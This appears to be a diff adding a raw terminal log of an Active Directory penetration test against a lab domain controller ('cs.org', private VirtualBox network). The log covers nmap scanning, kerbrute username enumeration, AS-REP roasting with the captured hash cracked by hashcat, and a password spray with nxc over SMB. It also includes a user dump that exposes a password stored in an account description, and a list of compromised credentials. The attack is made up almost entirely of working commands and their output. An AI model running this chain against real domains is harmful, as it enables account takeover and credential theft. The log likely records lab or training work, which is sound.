@@ -1,0 +1,891 @@
+❯ nmap -T4 192.168.56.10 -Pn
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-27 15:44 +0300
+Nmap scan report for 192.168.56.10
+Host is up (0.00023s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
+❯ nmap -T4 192.168.56.10 -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sV -sC
+Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-27 15:45 +0300
+Nmap scan report for 192.168.56.10
+Host is up (0.00032s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-27 12:45:59Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cs.org, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cs.org, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-09-27T12:45:59
+|_  start_date: N/A
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:8d:81:57 (Oracle VirtualBox virtual NIC)
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.96 seconds
+
+
+
+
+
+❯ kerbrute userenum \
+-d cs.org \
+--dc 192.168.56.10 \
+/home/eyad/Desktop/DEPI/Domain_2/vulen\ AD/username.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 09/27/26 - Ronnie Flathers @ropnop
+
+2026/09/27 17:44:20 >  Using KDC(s):
+2026/09/27 17:44:20 >  	192.168.56.10:88
+
+2026/09/27 17:45:01 >  [+] VALID USERNAME:	agnesse.chanda@cs.org
+2026/09/27 17:45:03 >  [+] VALID USERNAME:	aida.kristi@cs.org
+2026/09/27 17:46:38 >  [+] VALID USERNAME:	amye.nicolea@cs.org
+2026/09/27 17:46:41 >  [+] VALID USERNAME:	anabelle.law@cs.org
+2026/09/27 17:47:02 >  [+] VALID USERNAME:	angelica.shandee@cs.org
+2026/09/27 17:47:03 >  [+] VALID USERNAME:	angelina.dorene@cs.org
+2026/09/27 17:47:23 >  [+] VALID USERNAME:	anne.marleen@cs.org
+2026/09/27 17:47:38 >  [+] VALID USERNAME:	anthia.nari@cs.org
+2026/09/27 17:48:41 >  [+] VALID USERNAME:	aurea.mandie@cs.org
+2026/09/27 17:48:47 >  [+] VALID USERNAME:	aurore.aubrette@cs.org
+2026/09/27 17:48:52 >  [+] VALID USERNAME:	avis.charmine@cs.org
+2026/09/27 17:49:06 >  [+] VALID USERNAME:	barbi.bethena@cs.org
+2026/09/27 17:49:06 >  [+] VALID USERNAME:	barbi.elana@cs.org
+2026/09/27 17:50:28 >  [+] VALID USERNAME:	blondie.marabel@cs.org
+2026/09/27 17:50:29 >  [+] VALID USERNAME:	bobbee.malina@cs.org
+2026/09/27 17:50:42 >  [+] VALID USERNAME:	brandise.opaline@cs.org
+2026/09/27 17:50:55 >  [+] VALID USERNAME:	brigit.jenni@cs.org
+2026/09/27 17:51:08 >  [+] VALID USERNAME:	brittni.levin@cs.org
+2026/09/27 17:51:09 >  [+] VALID USERNAME:	brooke.shawna@cs.org
+2026/09/27 17:51:21 >  [+] VALID USERNAME:	calli.adena@cs.org
+2026/09/27 17:51:41 >  [+] VALID USERNAME:	cari.alina@cs.org
+2026/09/27 17:52:21 >  [+] VALID USERNAME:	cass.lorelle@cs.org
+2026/09/27 17:52:47 >  [+] VALID USERNAME:	cecily.logan@cs.org
+2026/09/27 17:52:52 >  [+] VALID USERNAME:	celestyna.avis@cs.org
+2026/09/27 17:53:19 >  [+] VALID USERNAME:	cheri.etta@cs.org
+2026/09/27 17:53:41 >  [+] VALID USERNAME:	christen.orly@cs.org
+2026/09/27 17:54:23 >  [+] VALID USERNAME:	codee.nessa@cs.org
+2026/09/27 17:54:32 >  [+] VALID USERNAME:	conchita.celestyna@cs.org
+2026/09/27 17:54:36 >  [+] VALID USERNAME:	constancy.annaliese@cs.org
+2026/09/27 17:54:47 >  [+] VALID USERNAME:	cordi.mei@cs.org
+2026/09/27 17:54:51 >  [+] VALID USERNAME:	coretta.eveleen@cs.org
+2026/09/27 17:55:30 >  [+] VALID USERNAME:	dacia.lorin@cs.org
+2026/09/27 17:56:19 >  [+] VALID USERNAME:	dawn.eugenie@cs.org
+2026/09/27 17:57:17 >  [+] VALID USERNAME:	dionis.jessie@cs.org
+2026/09/27 17:58:09 >  [+] VALID USERNAME:	drusilla.gates@cs.org
+2026/09/27 17:58:10 >  [+] VALID USERNAME:	drusy.isabelita@cs.org
+2026/09/27 17:58:12 >  [+] VALID USERNAME:	dulcia.paulette@cs.org
+2026/09/27 17:58:18 >  [+] VALID USERNAME:	dyane.ida@cs.org
+2026/09/27 17:58:23 >  [+] VALID USERNAME:	eadith.nicole@cs.org
+2026/09/27 17:58:33 >  [+] VALID USERNAME:	edita.aliza@cs.org
+2026/09/27 17:58:47 >  [+] VALID USERNAME:	electra.amalia@cs.org
+2026/09/27 17:59:50 >  [+] VALID USERNAME:	enriqueta.quinn@cs.org
+2026/09/27 17:59:58 >  [+] VALID USERNAME:	ermina.joanne@cs.org
+2026/09/27 18:00:13 >  [+] VALID USERNAME:	ethelda.aurea@cs.org
+2026/09/27 18:00:17 >  [+] VALID USERNAME:	etti.kellsie@cs.org
+2026/09/27 18:00:22 >  [+] VALID USERNAME:	eunice.shandee@cs.org
+2026/09/27 18:00:43 >  [+] VALID USERNAME:	fanya.beryl@cs.org
+2026/09/27 18:02:11 >  [+] VALID USERNAME:	genia.filide@cs.org
+2026/09/27 18:02:22 >  [+] VALID USERNAME:	georgina.jennie@cs.org
+2026/09/27 18:03:04 >  [+] VALID USERNAME:	gloria.cherri@cs.org
+2026/09/27 18:03:16 >  [+] VALID USERNAME:	gratia.khalil@cs.org
+2026/09/27 18:04:18 >  [+] VALID USERNAME:	helene.gaye@cs.org
+2026/09/27 18:04:29 >  [+] VALID USERNAME:	hermione.merci@cs.org
+2026/09/27 18:05:03 >  [+] VALID USERNAME:	imojean.glory@cs.org
+2026/09/27 18:05:06 >  [+] VALID USERNAME:	inez.emmalynne@cs.org
+2026/09/27 18:05:23 >  [+] VALID USERNAME:	isis.alika@cs.org
+2026/09/27 18:05:49 >  [+] VALID USERNAME:	janaya.agnola@cs.org
+2026/09/27 18:06:22 >  [+] VALID USERNAME:	jemima.emilie@cs.org
+2026/09/27 18:06:46 >  [+] VALID USERNAME:	jesselyn.annice@cs.org
+2026/09/27 18:09:52 >  [+] VALID USERNAME:	kip.roxanna@cs.org
+2026/09/27 18:10:15 >  [+] VALID USERNAME:	krissy.natassia@cs.org
+2026/09/27 18:10:58 >  [+] VALID USERNAME:	laurie.kalinda@cs.org
+2026/09/27 18:11:38 >  [+] VALID USERNAME:	letta.lorene@cs.org
+2026/09/27 18:12:50 >  [+] VALID USERNAME:	lorne.clovis@cs.org
+2026/09/27 18:13:01 >  [+] VALID USERNAME:      lou.maureen
+2026/09/27 18:13:08 >  [+] VALID USERNAME:	lucinda.rina@cs.org
+2026/09/27 18:13:35 >  [+] VALID USERNAME:	mada.bren@cs.org
+2026/09/27 18:13:45 >  [+] VALID USERNAME:	madelon.loise@cs.org
+2026/09/27 18:13:56 >  [+] VALID USERNAME:	mahalia.rosina@cs.org
+2026/09/27 18:14:14 >  [+] VALID USERNAME:	manya.lilllie@cs.org
+2026/09/27 18:14:37 >  [+] VALID USERNAME:	margret.raquela@cs.org
+2026/09/27 18:15:15 >  [+] VALID USERNAME:	marni.hilda@cs.org
+2026/09/27 18:15:16 >  [+] VALID USERNAME:	marnie.agnella@cs.org
+2026/09/27 18:15:48 >  [+] VALID USERNAME:	maurizia.allsun@cs.org
+2026/09/27 18:15:51 >  [+] VALID USERNAME:	maxi.maribel@cs.org
+2026/09/27 18:15:53 >  [+] VALID USERNAME:	may.asia@cs.org
+2026/09/27 18:16:03 >  [+] VALID USERNAME:	mei.lib@cs.org
+2026/09/27 18:16:30 >  [+] VALID USERNAME:	merissa.candace@cs.org
+2026/09/27 18:16:34 >  [+] VALID USERNAME:	merna.nerte@cs.org
+2026/09/27 18:18:02 >  [+] VALID USERNAME:	nanine.sela@cs.org
+2026/09/27 18:18:37 >  [+] VALID USERNAME:	nicholle.binni@cs.org
+2026/09/27 18:19:03 >  [+] VALID USERNAME:	noni.lucinda@cs.org
+2026/09/27 18:19:06 >  [+] VALID USERNAME:	norean.kristien@cs.org
+2026/09/27 18:19:52 >  [+] VALID USERNAME:	pammy.dasi@cs.org
+2026/09/27 18:20:11 >  [+] VALID USERNAME:	peggie.helli@cs.org
+2026/09/27 18:20:15 >  [+] VALID USERNAME:	pepi.allyn@cs.org
+2026/09/27 18:21:00 >  [+] VALID USERNAME:	rafaelita.ansley@cs.org
+2026/09/27 18:21:02 >  [+] VALID USERNAME:	raine.max@cs.org
+2026/09/27 18:21:03 >  [+] VALID USERNAME:	rakel.karyl@cs.org
+2026/09/27 18:21:11 >  [+] VALID USERNAME:	ranna.carla@cs.org
+2026/09/27 18:21:33 >  [+] VALID USERNAME:	renate.phil@cs.org
+2026/09/27 18:21:35 >  [+] VALID USERNAME:	renell.dre@cs.org
+2026/09/27 18:22:05 >  [+] VALID USERNAME:	robinetta.korrie@cs.org
+2026/09/27 18:22:18 >  [+] VALID USERNAME:	ronni.octavia@cs.org
+2026/09/27 18:22:29 >  [+] VALID USERNAME:	rosalyn.bunny@cs.org
+2026/09/27 18:22:53 >  [+] VALID USERNAME:	roz.lennie@cs.org
+2026/09/27 18:23:44 >  [+] VALID USERNAME:	selle.emalee@cs.org
+2026/09/27 18:24:05 >  [+] VALID USERNAME:	sharon.nani@cs.org
+2026/09/27 18:24:23 >  [+] VALID USERNAME:	shell.rodie@cs.org
+2026/09/27 18:26:02 >  [+] VALID USERNAME:	kip.roxanna@cs.org
+2026/09/27 18:26:38 >  [+] VALID USERNAME:	laurie.kalinda@cs.org
+2026/09/27 18:26:43 >  [+] VALID USERNAME:	lazare.korry@cs.org
+2026/09/27 18:27:29 >  [+] VALID USERNAME:	lorne.clovis@cs.org
+2026/09/27 18:27:36 >  Done! Tested 22316176 usernames (102 valid) in 2596.755 seconds
+
+
+
+$krb5asrep$23$lou.maureen@CS.ORG:cbd1a52bb6e873a72fb5fc57e73aec02$5a07af1098aa15b61f2c12c18ecf339903c1da319be50bc39f161bd99b9d3ad7e8938a18e148edf7143722ba2010d56ec0a9f4f63a53298f0a39fdda3f2ba647a5179e1c75eadc1e531b0a59ec08ba54d1ac61a7df70c481af5a11b27b1dfb8107b82204f528069b8f472ffb82d0b045d9a6d816d647345d364639a2b7368095d48b8c345b78c38823876dd6379ae3bec332ba1207d2ccaab29cd851c91056b7151765208d56c53b1684c2ee14710cc73936a9d0bd4964063e3dea6dd392e2be042605b331482fbe4f5cbb956fab6bd54b9a3c8308d83d593c0d55ebfef5b065
+
+
+
+
+
+❯ hashcat -m 18200 -a 0 hash.txt rockyou.txt
+hashcat (v7.1.2) starting
+
+Successfully initialized the NVIDIA main driver CUDA runtime library.
+
+Failed to initialize NVIDIA RTC library.
+
+* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
+             CUDA SDK Toolkit required for proper device support and utilization.
+             For more information, see: https://hashcat.net/faq/wrongdriver
+             Falling back to OpenCL runtime.
+
+nvmlDeviceGetFanSpeed(): Not Supported
+
+OpenCL API (OpenCL 3.0 CUDA 13.4.89) - Platform #1 [NVIDIA Corporation]
+=======================================================================
+* Device #01: NVIDIA GeForce GTX 1650, 3722/3722 MB (930 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 652 MB (4757 MB free)
+
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5asrep$23$lou.maureen@CS.ORG:cbd1a52bb6e873a72fb5fc57e73aec02$5a07af1098aa15b61f2c12c18ecf339903c1da319be50bc39f161bd99b9d3ad7e8938a18e148edf7143722ba2010d56ec0a9f4f63a53298f0a39fdda3f2ba647a5179e1c75eadc1e531b0a59ec08ba54d1ac61a7df70c481af5a11b27b1dfb8107b82204f528069b8f472ffb82d0b045d9a6d816d647345d364639a2b7368095d48b8c345b78c38823876dd6379ae3bec332ba1207d2ccaab29cd851c91056b7151765208d56c53b1684c2ee14710cc73936a9d0bd4964063e3dea6dd392e2be042605b331482fbe4f5cbb956fab6bd54b9a3c8308d83d593c0d55ebfef5b065:iloveyou2
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$lou.maureen@CS.ORG:cbd1a52bb6e873a72f...f5b065
+Time.Started.....: Sun Sep 27 19:23:22 2026 (0 secs)
+Time.Estimated...: Sun Sep 27 19:23:22 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........: 24962.0 kH/s (8.57ms) @ Accel:846 Loops:1 Thr:32 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 433152/14344384 (3.02%)
+Rejected.........: 0/433152 (0.00%)
+Restore.Point....: 0/14344384 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 123456 -> babaka
+Hardware.Mon.#01.: Temp: 48c Util: 23% Core:1920MHz Mem:4001MHz Bus:16
+
+Started: Sun Sep 27 19:23:21 2026
+Stopped: Sun Sep 27 19:23:23 2026
+
+
+
+
+
+
+❯ nxc smb 192.168.56.10 -d cs.org  -u valid_usernames.txt -p 'Changeme123!'  --continue-on-success
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         192.168.56.10   445    DC01             [-] cs.org\Administrator:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\agnesse.chanda:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\aida.kristi:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\amye.nicolea:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\anabelle.law:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\angelica.shandee:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\angelina.dorene:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\anne.marleen:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\anthia.nari:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\aurea.mandie:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\aurore.aubrette:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\avis.charmine:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\barbi.bethena:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\barbi.elana:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\blondie.marabel:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\bobbee.malina:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\brandise.opaline:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\brigit.jenni:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\brittni.levin:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\brooke.shawna:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\calli.adena:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\cari.alina:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\cass.lorelle:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\cecily.logan:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\celestyna.avis:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\cheri.etta:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\christen.orly:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\codee.nessa:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\conchita.celestyna:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\constancy.annaliese:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\cordi.mei:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\coretta.eveleen:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\dacia.lorin:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\dawn.eugenie:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\dionis.jessie:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\drusilla.gates:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\drusy.isabelita:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\dulcia.paulette:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\dyane.ida:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\eadith.nicole:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\edita.aliza:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\electra.amalia:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\enriqueta.quinn:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\ermina.joanne:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\ethelda.aurea:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\etti.kellsie:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\eunice.shandee:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\fanya.beryl:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [+] cs.org\genia.filide:Changeme123! 
+SMB         192.168.56.10   445    DC01             [-] cs.org\georgina.jennie:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\gloria.cherri:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\gratia.khalil:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\Guest:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\helene.gaye:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\hermione.merci:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\imojean.glory:Changeme123! STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] cs.org\inez.emmalynne:Changeme123! STATUS_LOGON_FAILURE 
+
+
+
+
+
+valid cred
+genia.filide:Changeme123!
+lou.maureen@CS.ORG:iloveyou2
+anthia.nari:+eanIM|J$/}w
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+❯ nxc smb 192.168.56.10 -d cs.org  -u 'genia.filide' -p 'Changeme123!' --users
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:False) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         192.168.56.10   445    DC01             [+] cs.org\genia.filide:Changeme123! 
+SMB         192.168.56.10   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.56.10   445    DC01             Administrator                 2026-09-27 05:28:43 0       Built-in account for administering the computer/domain 
+SMB         192.168.56.10   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.56.10   445    DC01             krbtgt                        2026-09-26 20:14:58 0       Key Distribution Center Service Account 
+SMB         192.168.56.10   445    DC01             manya.lilllie                 2026-09-26 20:28:01 0        
+SMB         192.168.56.10   445    DC01             avis.charmine                 2026-09-26 20:28:01 0        
+SMB         192.168.56.10   445    DC01             gratia.khalil                 2026-09-26 20:28:01 0        
+SMB         192.168.56.10   445    DC01             cass.lorelle                  2026-09-26 20:28:02 0        
+SMB         192.168.56.10   445    DC01             electra.amalia                2026-09-26 20:28:02 0        
+SMB         192.168.56.10   445    DC01             georgina.jennie               2026-09-26 20:28:02 0        
+SMB         192.168.56.10   445    DC01             pepi.allyn                    2026-09-26 20:28:02 0        
+SMB         192.168.56.10   445    DC01             ronni.octavia                 2026-09-26 20:28:03 0        
+SMB         192.168.56.10   445    DC01             amye.nicolea                  2026-09-26 20:28:03 0        
+SMB         192.168.56.10   445    DC01             calli.adena                   2026-09-26 20:28:03 0       Replication Account 
+SMB         192.168.56.10   445    DC01             gloria.cherri                 2026-09-26 20:28:03 0        
+SMB         192.168.56.10   445    DC01             ethelda.aurea                 2026-09-26 20:28:03 0        
+SMB         192.168.56.10   445    DC01             anabelle.law                  2026-09-26 20:28:04 0        
+SMB         192.168.56.10   445    DC01             brandise.opaline              2026-09-26 20:28:04 0        
+SMB         192.168.56.10   445    DC01             renell.dre                    2026-09-26 20:28:05 0        
+SMB         192.168.56.10   445    DC01             celestyna.avis                2026-09-26 20:28:05 0        
+SMB         192.168.56.10   445    DC01             blondie.marabel               2026-09-26 20:28:05 0        
+SMB         192.168.56.10   445    DC01             madelon.loise                 2026-09-26 20:28:05 0        
+SMB         192.168.56.10   445    DC01             barbi.bethena                 2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             nanine.sela                   2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             nicholle.binni                2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             merissa.candace               2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             drusilla.gates                2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             angelina.dorene               2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             brooke.shawna                 2026-09-26 20:28:06 0        
+SMB         192.168.56.10   445    DC01             agnesse.chanda                2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             dacia.lorin                   2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             maxi.maribel                  2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             cari.alina                    2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             cordi.mei                     2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             marnie.agnella                2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             janaya.agnola                 2026-09-26 20:28:07 0        
+SMB         192.168.56.10   445    DC01             etti.kellsie                  2026-09-26 20:28:24 0       Shared User 
+SMB         192.168.56.10   445    DC01             raine.max                     2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             kip.roxanna                   2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             lucinda.rina                  2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             noni.lucinda                  2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             aurea.mandie                  2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             dyane.ida                     2026-09-26 20:28:08 0        
+SMB         192.168.56.10   445    DC01             eunice.shandee                2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             merna.nerte                   2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             dionis.jessie                 2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             ranna.carla                   2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             isis.alika                    2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             laurie.kalinda                2026-09-26 20:28:09 0        
+SMB         192.168.56.10   445    DC01             anne.marleen                  2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             edita.aliza                   2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             shell.rodie                   2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             helene.gaye                   2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             constancy.annaliese           2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             robinetta.korrie              2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             marni.hilda                   2026-09-26 20:28:10 0        
+SMB         192.168.56.10   445    DC01             rakel.karyl                   2026-09-26 20:28:24 0       Shared User 
+SMB         192.168.56.10   445    DC01             jesselyn.annice               2026-09-26 20:28:11 0        
+SMB         192.168.56.10   445    DC01             lou.maureen                   2026-09-27 16:22:26 0       New User ,DefaultPassword 
+SMB         192.168.56.10   445    DC01             rosalyn.bunny                 2026-09-26 20:28:11 0        
+SMB         192.168.56.10   445    DC01             mahalia.rosina                2026-09-26 20:28:11 0        
+SMB         192.168.56.10   445    DC01             norean.kristien               2026-09-26 20:28:11 0       Replication Account 
+SMB         192.168.56.10   445    DC01             cecily.logan                  2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             lorne.clovis                  2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             roz.lennie                    2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             mei.lib                       2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             margret.raquela               2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             enriqueta.quinn               2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             lazare.korry                  2026-09-26 20:28:12 0        
+SMB         192.168.56.10   445    DC01             angelica.shandee              2026-09-26 20:28:13 0        
+SMB         192.168.56.10   445    DC01             brittni.levin                 2026-09-26 20:28:13 0        
+SMB         192.168.56.10   445    DC01             rafaelita.ansley              2026-09-26 20:28:13 0        
+SMB         192.168.56.10   445    DC01             brigit.jenni                  2026-09-26 20:28:13 0        
+SMB         192.168.56.10   445    DC01             anthia.nari                   2026-09-26 20:28:24 0       User Password +eanIM|J$/}w 
